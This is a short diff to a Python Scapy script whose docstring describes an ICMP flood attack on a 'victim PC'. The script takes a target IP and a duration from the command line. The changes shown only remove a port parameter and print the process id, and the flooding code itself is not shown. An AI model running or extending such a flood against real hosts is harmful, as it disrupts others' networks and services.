@@ -1,12 +1,13 @@
 #Extra packages needed for this to run: Scapy.py
 from datetime import datetime
 from scapy.all import *
+import os
 
 
 
 
 
-def ping(target_ip, targetedPort, duration):
+def ping(target_ip, duration):
     """
      Ping victim PC performing a ICMP Flood Attack
      The ICMP Flood Attack Aglortihm is based on sending packets 
@@ -22,4 +23,5 @@ def ping(target_ip, targetedPort, duration):
 if __name__ == "__main__":
     """Cmd args: targetIp, duration"""
     print("Preparing to ping victim PC")
+    print(os.getpid())
     ping(sys.argv[1] , int(sys.argv[2]))
